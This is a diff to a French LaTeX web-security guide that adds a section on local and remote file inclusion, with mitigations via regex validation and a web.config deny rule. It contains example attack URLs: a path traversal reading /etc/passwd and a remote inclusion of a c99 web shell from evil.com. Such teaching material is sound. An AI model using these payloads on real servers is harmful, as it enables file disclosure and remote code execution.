@@ -1478,8 +1478,30 @@ EXECUTE sp_executesql @SQL, N'@Field1 VARCHAR(10)', @user ;
 
 \subsection{Gestion des entrées utilisateurs: File Inclusion}
 \begin{Define}{LFI}
-Une \gls{LFI} est une inclusion de fichier local par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger.
+Une \gls{LFI} est une inclusion de fichier local par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir à lire des fichiers locaux propres aux systèmes d'exploitation ou au serveur web comme par exemple, les fichiers .htaccess sur debian ou web.config sur IIS.
 \end{Define}
+
+L'accès à la page pourrait être fait via l'URL: \url{http://example.com/preview.php?file=example.html}. En modifiant l'URL à \url{http://example.com/preview.php?file=../../../etc/passwd}, l'attaquant pourrait accéder au fichier /etc/passwd qui sur les serveurs Unix donnent de précieuses informations sur les utilisateurs d'un serveur.\\
+
+Cette menace peut être restreinte côté serveur par l'usage d'une vérification des entrées utilisateurs via des \gls{REGEX}. La gestion d'accès peut également se faire via la configuration du serveur. Par défaut l'accès à l'arborescence du dossier racine du serveur web est interdite mais l'utilisation de dossier virtuel peut permettre de contourner cette restriction.
+
+\begin{Define}{RFI}
+Une \gls{RFI} est une inclusion d'un fichier distant par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir notamment à inclure un code javascript malveillant exécuté par l'utilisateur ou un code exécuté par le serveur.
+\end{Define}
+
+En reprenant l'exemple précédent, l'attaquant pourrait exécuter la requête via l'URL: \url{http://example.com/preview.php?file=http://evil.com/c99.aspx}
+
+Par exemple, en ASP.NET, le fichier web.config permet de restreindre les accès par utilisateurs identifiés.
+\begin{Config}{XML}{Deny Folder Access}
+<location path="upload/" >
+<system.web>
+	<security>
+		<authorization>
+			<add accessType="Deny" roles="*" verbs="PUT">
+		</authorization>
+	</security>
+</system.web>
+\end{Config}
 
 \appendix
 \chapter{Cryptographie}
